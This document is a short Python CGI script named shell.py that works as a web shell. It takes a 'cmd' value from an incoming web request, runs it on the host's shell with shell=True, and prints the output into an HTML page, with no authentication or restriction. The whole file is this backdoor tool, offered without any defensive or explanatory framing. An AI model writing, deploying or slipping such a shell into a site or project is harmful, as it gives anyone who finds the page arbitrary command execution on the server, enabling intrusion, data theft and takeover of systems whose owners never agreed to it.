# shell.py
import subprocess
import cgi

print("Content-type: text/html\n")

form = cgi.FieldStorage()
cmd = form.getvalue("cmd", "echo No command provided")

try:
    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
    print("<pre>")
    print(output)
    print("</pre>")
except Exception as e:
    print(f"<pre>Error: {e}</pre>")